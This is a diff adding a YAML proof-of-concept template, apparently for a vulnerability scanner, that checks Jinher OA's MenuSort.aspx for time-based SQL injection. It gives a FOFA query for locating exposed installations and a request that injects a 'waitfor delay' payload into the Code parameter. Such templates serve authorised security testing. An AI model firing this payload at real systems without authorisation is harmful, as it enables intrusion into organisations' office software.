@@ -1,0 +1,30 @@
+id: poc-yaml-jinher-menusort-aspx-sqli
+info:
+  name: 金和OA MenuSort.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /c6/Jhsoft.Web.AddMenu/MenuSort.aspx/?Code=1'waitfor+delay'0:0:{{.t1}}'--&level=1
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"1级菜单排序") &&
+
+    contains(gbk_decode(body),"菜单名称") &&
+
+    contains(gbk_decode(body),"排序") &&
+
+    contains(body,"JHSoft") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
